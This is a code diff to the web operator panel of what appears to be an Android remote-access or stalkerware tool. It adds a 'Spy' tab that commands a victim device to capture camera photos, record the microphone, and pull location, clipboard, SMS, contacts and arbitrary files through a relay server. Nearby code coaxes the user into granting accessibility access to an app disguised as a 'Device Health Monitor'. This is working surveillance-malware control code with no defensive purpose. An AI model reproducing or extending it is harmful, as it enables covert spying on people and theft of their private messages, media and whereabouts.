@@ -1009,6 +1009,7 @@ select:focus { outline: none; border-color: var(--green); }
     <div class="dev-tabs">
       <div class="dev-tab active" id="dtab-screen" onclick="switchDevTab('screen')">Screen</div>
       <div class="dev-tab" id="dtab-shell" onclick="switchDevTab('shell')">Shell</div>
+      <div class="dev-tab" id="dtab-spy" onclick="switchDevTab('spy')">Spy</div>
       <div class="dev-tab" id="dtab-info" onclick="switchDevTab('info')">Info</div>
     </div>
 
@@ -1040,6 +1041,45 @@ select:focus { outline: none; border-color: var(--green); }
                   white-space:pre-wrap;word-break:break-all;color:var(--green);scrollbar-width:thin;
                   scrollbar-color:var(--border) transparent;">
         <span style="color:var(--fg2);">Send a command — output appears here.</span>
+      </div>
+    </div>
+
+    <!-- Spy sub-tab -->
+    <div class="dev-tab-body" id="dtabBody-spy" style="display:none;">
+      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:12px;">
+        <button class="btn" onclick="spyAction('__cam__')" style="font-size:.78em;padding:6px;">📷 Back Cam</button>
+        <button class="btn" onclick="spyAction('__cam_front__')" style="font-size:.78em;padding:6px;">🤳 Front Cam</button>
+        <button class="btn" onclick="spyMic()" style="font-size:.78em;padding:6px;">🎤 Mic</button>
+        <button class="btn" onclick="spyAction('__loc__')" style="font-size:.78em;padding:6px;">📍 Location</button>
+        <button class="btn" onclick="spyAction('__clip__')" style="font-size:.78em;padding:6px;">📋 Clipboard</button>
+        <button class="btn" onclick="spyAction('__sms__')" style="font-size:.78em;padding:6px;">💬 SMS</button>
+        <button class="btn" onclick="spyAction('__contacts__')" style="font-size:.78em;padding:6px;">👥 Contacts</button>
+      </div>
+      <div id="micRow" style="display:none;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+        <span style="font-size:.8em;color:var(--fg2);">Duration (secs):</span>
+        <input id="micSecs" type="number" value="10" min="1" max="60" style="width:60px;background:var(--bg3);border:1px solid var(--border);color:var(--fg);padding:4px;border-radius:4px;font-size:.85em;">
+        <button class="btn btn-primary" onclick="sendMic()" style="font-size:.78em;padding:5px 10px;">Start</button>
+        <button class="btn" onclick="document.getElementById('micRow').style.display='none'" style="font-size:.78em;padding:5px 8px;">✕</button>
+      </div>
+      <div id="spyStatus" style="font-size:.78em;color:var(--fg2);margin-bottom:8px;"></div>
+      <div id="spyPhotoSection" style="display:none;margin-bottom:10px;">
+        <div style="font-size:.75em;font-weight:700;color:var(--fg2);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px;">Latest Photo</div>
+        <div style="display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap;" id="spyPhotoNav"></div>
+        <img id="spyPhotoImg" alt="Camera photo" style="max-width:100%;border-radius:4px;border:1px solid var(--border);">
+      </div>
+      <div id="spyAudioSection" style="display:none;margin-bottom:10px;">
+        <div style="font-size:.75em;font-weight:700;color:var(--fg2);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px;">Latest Recording</div>
+        <audio id="spyAudio" controls style="width:100%;max-width:400px;"></audio>
+      </div>
+      <div id="spyTextOut" style="display:none;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:10px;font-size:.8em;max-height:280px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:var(--green);scrollbar-width:thin;"></div>
+      <div id="spyFilesSection" style="margin-top:10px;">
+        <div style="font-size:.75em;font-weight:700;color:var(--fg2);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px;">Upload File from Device</div>
+        <div style="display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap;align-items:center;">
+          <input id="uploadPathInput" placeholder="/sdcard/DCIM/photo.jpg" style="flex:1;min-width:160px;background:var(--bg3);border:1px solid var(--border);color:var(--fg);padding:5px 8px;border-radius:4px;font-size:.82em;" autocomplete="off">
+          <button class="btn btn-primary" onclick="sendUpload()" style="font-size:.78em;padding:5px 10px;">↑ Fetch</button>
+          <button class="btn" onclick="loadSpyFiles()" style="font-size:.78em;padding:5px 8px;">↻</button>
+        </div>
+        <div id="spyFileList" style="font-size:.78em;"></div>
       </div>
     </div>
 
@@ -1365,12 +1405,13 @@ function closeDevPanel() {
 
 function switchDevTab(name) {
   _devActiveTab = name;
-  ['screen','shell','info'].forEach(t => {
+  ['screen','shell','spy','info'].forEach(t => {
     document.getElementById('dtab-' + t).classList.toggle('active', t === name);
     document.getElementById('dtabBody-' + t).style.display = t === name ? '' : 'none';
   });
   if (name === 'shell') refreshDevHistory();
   if (name === 'info') loadDevInfo();
+  if (name === 'spy') { loadSpyFiles(); loadSpyPhotos(); loadSpyAudio(); }
 }
 
 async function devScreenRefresh() {
@@ -1504,6 +1545,158 @@ async function grantFullAccess(did) {
       log('Accessibility Settings opened on device — enable Device Health Monitor', 'info');
     } catch(e) {}
   }, 35000);
+}
+
+// ── Spy tab ───────────────────────────────────────────────────────────────────
+
+let _spyPollTimer = null;
+
+async function spyAction(cmd) {
+  if (!_selectedDid) return;
+  const status = document.getElementById('spyStatus');
+  status.textContent = 'Sending ' + cmd + '…';
+  try {
+    await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/cmd', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({cmd})
+    });
+    status.textContent = 'Command sent — waiting for result…';
+    // Poll history for the result
+    const isPhoto = cmd.includes('cam');
+    const isAudio = cmd.includes('mic');
+    let tries = 0;
+    const poll = setInterval(async () => {
+      tries++;
+      if (tries > 20) { clearInterval(poll); status.textContent = 'Timed out.'; return; }
+      if (isPhoto) {
+        await loadSpyPhotos();
+        if (document.getElementById('spyPhotoSection').style.display !== 'none') {
+          clearInterval(poll); status.textContent = 'Photo received!';
+        }
+      } else if (isAudio) {
+        await loadSpyAudio();
+      } else {
+        const r = await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/history');
+        const hist = await r.json();
+        const entry = hist.find(h => h.cmd === cmd);
+        if (entry) {
+          clearInterval(poll);
+          status.textContent = '';
+          const out = document.getElementById('spyTextOut');
+          out.style.display = '';
+          out.textContent = '[' + entry.ts + '] ' + entry.cmd + '\n' + entry.out;
+        }
+      }
+    }, 2000);
+  } catch(e) { document.getElementById('spyStatus').textContent = 'Error: ' + e; }
+}
+
+function spyMic() {
+  const row = document.getElementById('micRow');
+  row.style.display = row.style.display === 'none' ? 'flex' : 'none';
+}
+
+async function sendMic() {
+  if (!_selectedDid) return;
+  const secs = parseInt(document.getElementById('micSecs').value) || 10;
+  const cmd = '__mic:' + secs + '__';
+  document.getElementById('micRow').style.display = 'none';
+  document.getElementById('spyStatus').textContent = 'Recording ' + secs + 's…';
+  try {
+    await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/cmd', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({cmd})
+    });
+    // Poll for audio
+    let tries = 0;
+    const prev = await getLatestAudioTs();
+    const poll = setInterval(async () => {
+      tries++;
+      if (tries > (secs + 20)) { clearInterval(poll); document.getElementById('spyStatus').textContent = 'Recording timed out.'; return; }
+      const ts = await getLatestAudioTs();
+      if (ts > prev) {
+        clearInterval(poll);
+        await loadSpyAudio();
+        document.getElementById('spyStatus').textContent = 'Recording ready!';
+      }
+    }, 2000);
+  } catch(e) { document.getElementById('spyStatus').textContent = 'Mic error: ' + e; }
+}
+
+async function getLatestAudioTs() {
+  try {
+    const r = await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/audio/list');
+    const list = await r.json();
+    return list.length ? list[0].ts : 0;
+  } catch(e) { return 0; }
+}
+
+async function loadSpyPhotos() {
+  if (!_selectedDid) return;
+  try {
+    const r = await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/photo/list');
+    const list = await r.json();
+    if (!list.length) return;
+    document.getElementById('spyPhotoSection').style.display = '';
+    const nav = document.getElementById('spyPhotoNav');
+    nav.innerHTML = list.map((p,i) =>
+      `<button class="btn" onclick="showSpyPhoto(${i})" style="font-size:.75em;padding:3px 8px;">${p.cam} ${new Date(p.ts*1000).toLocaleTimeString()}</button>`
+    ).join('');
+    showSpyPhoto(0);
+  } catch(e) {}
+}
+
+function showSpyPhoto(idx) {
+  if (!_selectedDid) return;
+  const img = document.getElementById('spyPhotoImg');
+  img.src = RELAY_BASE + '/api/devices/' + _selectedDid + '/photo?idx=' + idx + '&t=' + Date.now();
+}
+
+async function loadSpyAudio() {
+  if (!_selectedDid) return;
+  try {
+    const r = await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/audio/list');
+    const list = await r.json();
+    if (!list.length) return;
+    document.getElementById('spyAudioSection').style.display = '';
+    const audio = document.getElementById('spyAudio');
+    const url = RELAY_BASE + '/api/devices/' + _selectedDid + '/audio?t=' + Date.now();
+    if (audio.src !== url) { audio.src = url; }
+  } catch(e) {}
+}
+
+async function loadSpyFiles() {
+  if (!_selectedDid) return;
+  try {
+    const r = await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/files');
+    const files = await r.json();
+    const el = document.getElementById('spyFileList');
+    if (!files.length) { el.innerHTML = '<span style="color:var(--fg2);">No files uploaded yet.</span>'; return; }
+    el.innerHTML = files.map(f =>
+      `<div style="display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid var(--border);">` +
+      `<span style="flex:1;color:var(--fg);">${escHtml(f.name)}</span>` +
+      `<span style="color:var(--fg2);font-size:.75em;">${(f.size/1024).toFixed(1)}KB · ${new Date(f.ts*1000).toLocaleTimeString()}</span>` +
+      `<a href="${RELAY_BASE}/api/devices/${encodeURIComponent(_selectedDid)}/files/${encodeURIComponent(f.name)}" ` +
+      `class="btn" style="font-size:.72em;padding:3px 8px;text-decoration:none;" download="${escHtml(f.name)}">↓ DL</a>` +
+      `</div>`
+    ).join('');
+  } catch(e) {}
+}
+
+async function sendUpload() {
+  if (!_selectedDid) return;
+  const path = document.getElementById('uploadPathInput').value.trim();
+  if (!path) return;
+  const cmd = '__upload:' + path + '__';
+  document.getElementById('spyStatus').textContent = 'Uploading ' + path + '…';
+  try {
+    await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/cmd', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({cmd})
+    });
+    setTimeout(loadSpyFiles, 5000);
+    setTimeout(loadSpyFiles, 10000);
+  } catch(e) { document.getElementById('spyStatus').textContent = 'Upload error: ' + e; }
 }
 
 async function uninstallDevice() {
